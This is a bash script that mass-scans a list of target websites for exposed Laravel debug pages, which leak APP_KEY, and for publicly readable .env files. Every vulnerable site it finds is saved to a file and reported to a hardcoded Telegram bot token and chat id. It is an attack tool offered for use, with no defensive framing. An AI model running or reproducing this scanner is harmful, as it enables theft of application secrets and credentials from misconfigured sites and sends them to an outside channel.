#!/bin/bash
banner()
{
  printf " %-40s \n" "`python3 logo.py`"
}


banner


sed -i 's/\r//g' $0
limit=10; # 10 site / request
wpinstall(){
red='\e[91m'
green='\e[92m'
merah='\e[91m'
cyan='\e[96m'
kuning='\e[93m'
oren='\033[0;33m' 
margenta='\e[95m'
biru='\e[94m'
ijo="\e[92m"
putih="\e[97m"
normal='\033[0m'
bold='\e[1m'
labelmerah='\e[41m'
labelijo='\e[42m'
labelkuning='\e[43m'
labelpp='\e[45m'
token="1324589535:AAFjLXoB4RI2hqFpIYwHOo__EVEaSEMnqBc"
chatid="782664019"

  if [[ `curl --connect-timeout 10 --max-time 10 -s -d  "username[]=1" --url "http://${url}" | tr '\0' '\n'` =~ '<td>APP_KEY' ]];
		then
		echo -e "[ ${ijo}+${normal} ] [$itung/$totallines] ${url}/ | Status: ${ijo}DEBUG${normal}"
		echo "$url | DEBUG" >> Valid_Debug.txt
		curl -s -X POST https://api.telegram.org/bot${token}/sendMessage -d chat_id=${chatid} -d text="#----------------------------- $url | DEBUG"
	else
	echo -e "[ ${merah}-${normal} ] [$itung/$totallines] ${url} ${merah}BAD${normal} | DEBUG"
	fi
	if [[ `curl --connect-timeout 4 --max-time 4 -s --url "http://${url}/.env" | tr '\0' '\n'` =~ 'MAIL_HOST=' ]]; then
	echo -e "[ ${ijo}+${normal} ] [$itung/$totallines] ${url}/.env | Status: ${ijo}Env${normal}"
	echo "${url}/.env " >> Valid_Env.txt
	curl -s -X POST https://api.telegram.org/bot${token}/sendMessage -d chat_id=${chatid} -d text="#----------------------------- $url | ENV"
	else
	echo -e "[ ${merah}-${normal} ] [$itung/$totallines] ${url} ${merah}BAD${normal} | ENV"
	fi
	
	
}
itung=1
read -p "LIST TARGET : " list
totallines=$(wc -l < ${list})
printf "${white} -> Jumlahnya ${ijo} $totallines ${cbg}\n"
read -p "THREADS : " THREADS
sed -i 's/\r//g' ${list}
for url in `cat ${list}`; do
	index=$((itung++))
    username="${mailist[$i]}"
    email=${array[0]}
    password=${array[1]}
   tt=$(expr $limit % $THREADS)
   if [[ $tt == 0 && $limit > 0 ]]; then
   sleep 0
   fi
   let itung++
   jam=$(date '+%H')
   menit=$(date '+%M')
   
		wpinstall ${url}  &
	done
		wait